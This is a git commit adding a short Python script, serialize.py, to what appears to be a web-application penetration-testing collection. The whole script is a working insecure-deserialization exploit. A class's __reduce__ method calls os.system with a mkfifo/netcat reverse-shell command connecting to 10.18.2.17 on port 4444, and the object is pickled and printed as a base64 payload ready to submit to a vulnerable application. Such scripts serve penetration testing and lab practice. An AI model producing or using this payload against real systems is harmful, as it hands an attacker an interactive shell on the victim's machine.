f4585ae51678739109a4c59a8be3d8f2c8f0f7b6
H3ll_Ka1ser <98783688+H3llKa1ser@users.noreply.github.com>
2023-12-27 20:00:21 +0200

    Create serialize.py

---
+++ Web Application Penetration Testing/Scripts/serialize.py
@@ -0,0 +1,14 @@
+import pickle
+import base64
+import os
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 10.18.2.17 4444 > /tmp/f')
+        return os.system, (cmd,)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
